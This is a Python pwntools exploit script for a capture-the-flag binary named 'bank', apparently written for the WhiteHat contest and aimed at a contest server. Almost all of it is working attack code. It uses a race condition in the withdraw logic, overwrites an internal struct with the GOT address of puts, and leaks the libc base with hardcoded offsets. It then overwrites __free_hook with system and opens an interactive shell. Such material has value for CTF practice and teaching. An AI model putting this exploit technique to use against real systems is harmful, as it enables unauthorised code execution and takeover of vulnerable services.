'''
Offset used in this exploit code is local-only -> not remote server libc offset
'''

from pwn import *
import sys, time
context.binary = "./bank"
binary = ELF("bank")
#context.log_level = "debug"
prog = log.progress("Exploit")
if len(sys.argv) == 1:
    p = process(["./bank"])
    log.info("PID : " + str(proc.pidof(p)[0]))
else:
    p = remote("challenges.whitehatcontest.kr", "9999")
def show():
    p.recvuntil("---> ")
    p.sendline("1")
def transfer(bank, money):
    p.recvuntil("---> ")
    p.sendline("2")
    p.recvuntil("---> ")
    p.sendline(str(bank))
    p.recvuntil("---> ")
    p.sendline(str(money))
def deposit(bank, money):
    p.recvuntil("---> ")
    p.sendline("3")
    p.recvuntil("---> ")
    p.sendline(str(bank))
    p.recvuntil("---> ")
    p.sendline(str(money))
def withdraw(bank, money):
    p.recvuntil("---> ")
    p.sendline("4")
    p.recvuntil("---> ")
    p.sendline(str(bank))
    p.recvuntil("---> ")
    p.sendline(str(money))
def buy(item, data, change=False):
    p.recvuntil("---> ")
    p.sendline("5")
    p.recvuntil("---> ")
    p.sendline(item)
    if change:
        p.recvuntil("---> ")
        p.sendline("1")
        p.sendline(data)
def edit(idx, data):
    p.recvuntil("---> ")
    p.sendline("6")
    p.recvuntil("---> ")
    p.sendline(str(idx))
    p.recvuntil("---> ")
    p.sendline(data)
deposit(1, 800)
for i in xrange(4):
    transfer(1, 100)
withdraw(1, 400)
withdraw(1, 400)
prog.status("Race Condition Start...")
time.sleep(0.5)
withdraw(1, 999999999999999999 + 1600)
prog.status("Done")
for i in xrange(17):
    buy("1", "NOTHING", False)
    
prog.status("Overwrite Bank Struct")
edit(16, p64(binary.got["puts"]))
edit(0, "/bin/sh\x00")
prog.status("Leak...")
show()
p.recvuntil("Account Number : ")
libc_base = u64(p.recv(6).ljust(8, "\x00")) - 0x6f690
free_hook = libc_base + 0x3c67a8
system = libc_base + 0x45390
log.info("libc_base : " + hex(libc_base))
log.info("__free_hook : " + hex(free_hook))
prog.status("Overwrite __free_hook")
edit(16, p64(free_hook))
buy("\xff", p64(system), True)
prog.status("Getting Shell")
p.sendline("Exploit")
p.interactive()
